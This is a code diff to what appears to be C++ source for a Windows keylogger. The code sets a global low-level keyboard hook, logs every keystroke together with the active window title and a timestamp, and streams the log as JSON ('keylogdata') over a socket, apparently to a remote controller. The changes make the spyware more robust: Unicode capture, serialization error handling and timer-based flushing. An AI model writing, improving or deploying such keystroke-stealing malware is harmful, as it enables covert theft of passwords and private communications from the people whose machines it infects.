@@ -25,6 +25,14 @@ static mutex g_sendMutex;
 static string g_keyBuffer = "";
 static mutex g_bufferMutex;
 
+static string wide_to_utf8(const wstring& wstr) {
+    if (wstr.empty()) return "";
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    string strTo(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+    return strTo;
+}
+
 static bool safe_send_raw(SOCKET sock, const string& data) {
     if (sock == INVALID_SOCKET) return false;
     const char* ptr = data.c_str();
@@ -47,12 +55,17 @@ static void flush_buffer() {
         g_keyBuffer.clear();
     }
 
-    lock_guard<mutex> lock(g_sendMutex);
-    json j;
-    j["action"] = "keylogdata";
-    j["log"] = dataToLog;
-    string serialized = j.dump() + "\r\n";
-    safe_send_raw(g_sock, serialized);
+    try {
+        lock_guard<mutex> lock(g_sendMutex);
+        json j;
+        j["action"] = "keylogdata";
+        j["log"] = dataToLog;
+        // Use replace error handler to ensure valid UTF-8
+        string serialized = j.dump(-1, ' ', false, json::error_handler_t::replace) + "\r\n";
+        safe_send_raw(g_sock, serialized);
+    } catch (...) {
+        // Prevent crash on serialization errors
+    }
 }
 
 static void append_to_buffer(const string& log) {
@@ -61,11 +74,12 @@ static void append_to_buffer(const string& log) {
 }
 
 static string get_active_window_title() {
-    char title[256];
+    wchar_t title[512];
     HWND hwnd = GetForegroundWindow();
     if (hwnd) {
-        GetWindowTextA(hwnd, title, sizeof(title));
-        return string(title);
+        if (GetWindowTextW(hwnd, title, 512) > 0) {
+            return wide_to_utf8(title);
+        }
     }
     return "Unknown";
 }
@@ -86,13 +100,12 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
         HWND currentWindow = GetForegroundWindow();
         if (currentWindow != g_lastWindow) {
-            flush_buffer(); // Send old buffer before header
             g_lastWindow = currentWindow;
             string windowTitle = get_active_window_title();
             string timeStr = get_current_time_str();
             string header = "\r\n\r\n[" + timeStr + "] [" + windowTitle + "]\r\n";
             append_to_buffer(header);
-            flush_buffer(); // Send header immediately
+            // Don't flush here, let the timer do it to keep hook fast
         }
 
         string keyStr = "";
@@ -118,18 +131,14 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
         if (!isSpecial) {
             BYTE keyboardState[256];
-            GetKeyboardState(keyboardState);
-            keyboardState[VK_SHIFT] = GetKeyState(VK_SHIFT) & 0x8000 ? 0x80 : 0;
-            keyboardState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 0x0001 ? 0x01 : 0;
+            // In LL hook, we should use GetKeyState for modifiers as GetKeyboardState might be stale
+            for(int i=0; i<256; i++) keyboardState[i] = (BYTE)GetKeyState(i);
 
-            wchar_t unicodeChar[5];
-            int res = ToUnicode(vkCode, pKbdStruct->scanCode, keyboardState, unicodeChar, 4, 0);
+            wchar_t unicodeChar[8];
+            int res = ToUnicode(vkCode, pKbdStruct->scanCode, keyboardState, unicodeChar, 8, 0);
             if (res > 0) {
                 unicodeChar[res] = L'\0';
-                int size_needed = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, res, NULL, 0, NULL, NULL);
-                string utf8Str(size_needed, 0);
-                WideCharToMultiByte(CP_UTF8, 0, unicodeChar, res, &utf8Str[0], size_needed, NULL, NULL);
-                keyStr = utf8Str;
+                keyStr = wide_to_utf8(unicodeChar);
             }
         }
 
@@ -143,11 +152,11 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 void StartHook() {
     g_hookThreadId = GetCurrentThreadId();
     g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-    MSG msg;
 
     // Periodically flush buffer every 500ms
     UINT_PTR timerId = SetTimer(NULL, 0, 500, NULL);
 
+    MSG msg;
     while (g_running && GetMessage(&msg, NULL, 0, 0)) {
         if (msg.message == WM_TIMER && msg.wParam == timerId) {
             flush_buffer();
